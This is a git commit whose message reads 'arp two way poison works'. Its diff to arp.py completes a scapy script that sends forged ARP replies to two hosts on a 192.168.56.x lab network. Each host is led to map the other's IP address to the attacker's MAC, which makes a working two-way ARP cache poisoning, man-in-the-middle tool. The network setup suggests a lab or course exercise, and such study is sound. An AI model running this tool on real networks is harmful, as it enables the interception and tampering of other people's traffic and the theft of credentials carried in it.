f5e62814c9dfe13e76121e87169556d5ec859578
mankahuszar <97175874+cerealOD@users.noreply.github.com>
2022-06-09 19:08:44 +0200

    arp two way poison works

--- arp.py
+++ arp.py
@@ -3,14 +3,17 @@ from scapy.arch import get_if_hwaddr
 from scapy.layers.l2 import Ether, ARP
 from scapy.sendrecv import sendp
 
+hosts = [["192.168.56.101", "08:00:27:b7:c4:af"], ["192.168.56.102", "08:00:27:cc:08:6f"]]
+interface = "enp0s3"
 
-def poison(interface: str, hosts: list):
+def poison(interface, hosts):
     macAttacker = get_if_hwaddr(interface)
 
-    def sendPoison(srcIP: str, dstIP: str, srcMAC: str, dstMAC: str):
+    def sendPoison(srcIP, dstIP, dstMAC):
         arp = Ether() / ARP()
         arp[Ether].src = macAttacker
-        arp[ARP].hwsrc = srcMAC
+        arp[Ether].dst = dstMAC
+        arp[ARP].hwsrc = macAttacker
         arp[ARP].psrc =  srcIP
         arp[ARP].hwdst = dstMAC
         arp[ARP].pdst = dstIP
@@ -20,6 +23,7 @@ def poison(interface: str, hosts: list):
     for host1 in hosts:
         for host2 in hosts:
             if host1 != host2:
-                for host1IP in hosts[host1]:
-                    for host2IP in hosts[host2]:
-                        sendPoison(host1IP, host2IP, host1, host2)
+                sendPoison(host1[0], host2[0], host2[1])
+
+if __name__ == '__main__':
+    poison(interface, hosts)
